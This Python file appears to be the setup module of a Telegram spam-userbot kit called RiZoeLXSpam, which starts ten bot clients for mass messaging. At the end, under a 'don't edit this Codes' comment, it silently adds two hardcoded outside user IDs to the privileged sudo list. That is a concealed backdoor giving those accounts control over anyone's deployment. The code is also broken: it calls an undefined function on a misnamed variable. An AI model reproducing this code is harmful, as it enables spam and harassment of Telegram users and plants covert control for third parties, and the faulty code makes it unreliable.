# RiZoeLXSpam - Spam Userbots
# Copyright © 2021 @RiZoeLX

import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

rizoelversion = "v2.0.3"

#values

API_ID = ""  #Fill Api ID 
API_HASH = ""  #Fill Api Hash
ALIVE_PIC = ""  #Alive pic (telegraph link)
CMD_HNDLR = ""  #Cmd Handler
BOT_TOKEN = ""   # Bot Token 
BOT_TOKEN2 = ""  # Bot Token
BOT_TOKEN3 = ""  # Bot Token
BOT_TOKEN4 = ""  # Bot Token
BOT_TOKEN5 = ""  # Bot Token
BOT_TOKEN6 = ""  # Bot Token
BOT_TOKEN7 = ""  # Bot Token
BOT_TOKEN8 = ""  # Bot Token
BOT_TOKEN9 = ""  # Bot Token
BOT_TOKEN10 = "" # Bot Token
OWNER_ID = "" # Owner Id (Only One Owner id don't Fill 2-3 ids)
SUDO = "" # Sudo Users Ids Space By Space


#Tokens

Riz = TelegramClient('Riz', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

Riz2 = TelegramClient('Riz2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

Riz3 = TelegramClient('Riz3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

Riz4 = TelegramClient('Riz4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

Riz5 = TelegramClient('Riz5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

Riz6 = TelegramClient('Riz6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

Riz7 = TelegramClient('Riz7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

Riz8 = TelegramClient('Riz8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

Riz9 = TelegramClient('Riz9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

Riz10 = TelegramClient('Riz10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)


# don't edit this Codes
SUDO_USERS = []
if SUDO:
     SUDO_USERS = make_int(sudo)  
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(1517994352)
SUDO_USERS.append(1789859817)
